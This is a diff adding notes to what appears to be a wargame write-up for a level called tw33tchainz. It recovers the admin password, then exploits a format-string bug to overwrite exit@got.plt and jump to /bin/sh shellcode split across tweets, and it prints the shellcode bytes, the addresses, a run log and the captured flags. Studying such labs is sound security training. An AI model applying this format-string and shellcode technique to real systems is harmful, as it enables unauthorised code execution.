@@ -297,3 +297,47 @@ uid=1022(lab6C) gid=1023(lab6C) euid=1023(lab6B) groups=1024(lab6B),1001(gameuse
 cat ~lab6B/.pass
 p4rti4l_0verwr1tes_r_3nuff
 ```
+
+## Project 1
+* Hidden menu option 3 turns you into in admin, which reveals option 6, which prints addresses of tweets.
+  * Also breaks the menu by printing a bad color code around the last tweet.
+* Tweets are allocated with `calloc` and form a linked list.
+* Linked list store the string _in band_, and the _next_ pointer at +0x10.
+* Other than the first and second tweet, tweets are 0x20 bytes apart (though only 0x14 bytes in size).
+* Any newline found in a tweet is replaced with 0xcc (`int 3`).
+* After the _next_ pointer a 0xc3 (`ret`) is written in.
+* You can login to become an admin, and then you can enable a debug mode that dumps the addresses of the tweets.
+* 'secret' Password is 16 bytes read from _/dev/urandom_,
+* 'generated' password is 16 bytes, generated using the secret password, the username, and the salt.
+  * We can figure out the secret password from the generated password.
+  * each byte password[i] = (secretpass[i] + salt[i]) ^ username[i]
+  * therefore, secretpass[i] = (password[i] ^ username[i]) - salt[i]
+* Admin mode also changes how the last tweet is printed in `last_tweet`: It uses `printf`, with the tweet body as the format string.
+  * It also copies the tweet to the stack first.
+
+* Format string is 0x1f bytes after the first argument to the vulnerable `printf`: Argument 8$.
+* Can put shellcode in tweets, but they are only 16 bytes, so will need them to hop to the next.
+* Second tweet is at 0x0804e040. This is where we will put the shellcode. It doesn't fit in 16 bytes so it'll have to jump to another tweet.
+* Third tweet is at 0x0804e060.
+* Can overwrite `exit@got.plt` which is at 0x0804d03c with the address of the second tweet.
+* Tweets:
+  1. <doesn't matter>.
+  2. "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x90\xEB\x10".
+  3. "\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80".
+  4. Write 0xe0 to second lsb of `exit@got.plt`.
+  5. Write 0x40 to lsb of 'exit@got.plt'.
+* See _project1.py_.
+
+```bash
+project1@warzone:/tmp$ python /tmp/project1.py
+[+] Starting program '/levels/project1/tw33tchainz': Done
+[*] PID: [3138]
+[*] Paused (press any to continue)
+[*] Password: 8f6d83b5673d78207a9b3b9a6fa02989
+[*] Swapped password: b5836d8f20783d679a3b9b7a8929a06f
+[*] Secret password: 75832d8fe038fd279afb9b3a89e9606f
+[*] Switching to interactive mode
+...
+$ cat ~project1_priv/.pass
+m0_tw33ts_m0_ch4inz_n0_m0n3y
+```
